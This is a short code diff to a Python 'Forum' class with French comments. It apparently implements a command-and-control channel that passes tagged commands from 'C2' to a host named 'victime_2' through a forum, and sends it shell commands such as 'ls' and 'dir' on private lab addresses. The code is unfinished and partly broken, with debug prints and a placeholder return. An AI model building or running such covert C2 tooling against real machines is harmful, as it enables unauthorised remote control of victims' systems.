@@ -62,11 +62,35 @@ class Forum:
                 print("not find, attente 10s...")
                 time.sleep(10)
 
-        # incrémente le compteur de commandes envoyées
-        self.num_commande += 1
-        return self.last["body"]
+        print("coucou")
+        #extraire les donner du retour
+        try:
+            parts = self.last['body'].split("];")
+            # parts exemple:
+            # ['[FROM=C2', '[TO=victime_2', '[SEQ=42', ' commande...']
+            if len(parts) < 4:
+                return None, None
+
+            from_part = parts[0]  # "[FROM=C2"
+            to_part = parts[1]  # "[TO=victime_2"
+            seq_part = parts[2]  # "[SEQ=42"
+            cmd_part = "];".join(parts[3:]).strip()
+
+            sender = from_part.split("=", 1)[1].rstrip("]")
+            target = to_part.split("=", 1)[1].rstrip("]")
+            seq = seq_part.split("=", 1)[1].rstrip("]")
+
+            if sender != self.name or target != self.user:
+                return None, None
+
+            self.num_commande += 1
+            return "coucou"
+
+        except Exception:
+            return None, None
 
 
 # utilisation
-victime_2 = Forum("192.168.56.1", 6000, "C2", "testtest", "victime_2")
-print(victime_2.execute("ls"))
+print("coucou")
+victime_2 = Forum("192.168.1.8", 6000, "C2", "testtest", "victime_2")
+print(victime_2.execute("dir"))
